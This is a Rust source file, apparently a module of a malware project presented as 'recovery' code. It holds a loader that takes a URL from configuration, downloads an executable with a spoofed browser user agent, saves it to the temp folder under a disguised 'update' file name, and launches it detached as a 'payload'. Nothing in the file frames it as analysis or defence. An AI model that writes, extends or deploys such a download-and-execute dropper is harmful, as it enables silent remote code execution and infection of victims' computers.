use crate::recovery::settings::RecoveryControl;
use std::env;
use std::path::PathBuf;
use std::process::Command;
use tokio::fs;
use tokio::io::AsyncWriteExt;
use tracing::{debug, error, info};

pub async fn run_loader() {
    let control = RecoveryControl::global();
    let Some(url) = control.loader_url() else {
        return;
    };

    if url.trim().is_empty() {
        return;
    }

    info!(url = %url, "starting loader task");

    let temp_dir = env::temp_dir();
    let file_name = format!("update-{}.exe", uuid::Uuid::new_v4());
    let dest_path = temp_dir.join(file_name);

    match download_payload(url, &dest_path).await {
        Ok(_) => {
            info!(path = %dest_path.display(), "payload downloaded successfully");
            match execute_payload(&dest_path) {
                Ok(_) => info!("payload executed"),
                Err(e) => error!(error = %e, "failed to execute payload"),
            }
        }
        Err(e) => error!(error = %e, "failed to download payload"),
    }
}

async fn download_payload(url: &str, dest: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        .build()?;

    let response = client.get(url).send().await?;
    if !response.status().is_success() {
        return Err(format!("server returned status: {}", response.status()).into());
    }

    let bytes = response.bytes().await?;
    let mut file = fs::File::create(dest).await?;
    file.write_all(&bytes).await?;
    
    Ok(())
}

fn execute_payload(path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    // Start detached
    Command::new(path)
        .spawn()?;
    Ok(())
}
